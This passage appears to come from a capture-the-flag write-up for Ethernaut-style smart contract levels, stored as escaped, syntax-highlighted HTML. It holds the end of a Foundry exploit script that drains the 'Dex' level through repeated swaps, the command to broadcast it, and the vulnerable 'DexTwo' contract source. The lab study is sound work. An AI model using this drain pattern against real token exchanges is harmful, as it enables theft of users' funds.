&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;45&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;        
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;DexSolve.s.sol:DexSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;23-dex-two&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#23-dex-two&quot; aria-label=&quot;Anchor link for: 23-dex-two&quot;&gt;23 Dex Two&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;DexTwo.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;openzeppelin-contracts&#x2F;contracts&#x2F;access&#x2F;Ownable.sol&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DexTwo is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ownable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x00&lt;&#x2F;span&gt;&lt;span&gt;)) {
&lt;&#x2F;span&gt;&lt;span&gt;  address public token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setTokens&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _token2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;add_liquidity&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address token_address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token_address)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Not enough to swap&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint swapAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getSwapAmount&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;swapAmount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;swapAmount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  } 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getSwapAmount&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;((amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SwappableTokenTwo&lt;&#x2F;span&gt;&lt;span&gt;(token1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SwappableTokenTwo&lt;&#x2F;span&gt;&lt;span&gt;(token2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address account&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(account)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SwappableTokenTwo is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;  address private _dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address dexInstance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory symbol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint initialSupply) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;symbol) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;initialSupply)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;dexInstance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;_dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;InvalidApprover&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
